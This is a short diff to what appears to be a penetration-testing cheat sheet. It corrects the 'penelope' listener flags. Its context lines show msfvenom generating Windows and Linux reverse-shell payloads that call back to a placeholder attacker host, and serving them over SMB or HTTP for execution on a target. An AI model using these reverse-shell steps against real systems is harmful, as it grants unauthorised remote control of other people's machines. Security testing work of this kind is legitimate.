@@ -201,7 +201,7 @@ sudo systemctl stop smbd nmbd
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o ~/payloads/shell.exe
 
 # Step 2 (Terminal 1): start listener
-penelope -0 443
+penelope -p 443 -O
 
 # Step 3 (Terminal 2): start server from payload directory
 cd ~/payloads && ./servr.sh smb
@@ -217,7 +217,7 @@ C:\Windows\Temp\shell.exe
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o ~/payloads/shell.elf
 
 # Step 2 (Terminal 1): start listener
-penelope -0 443
+penelope -p 443 -O
 
 # Step 3 (Terminal 2): start server
 cd ~/payloads && ./servr.sh http --port 8080
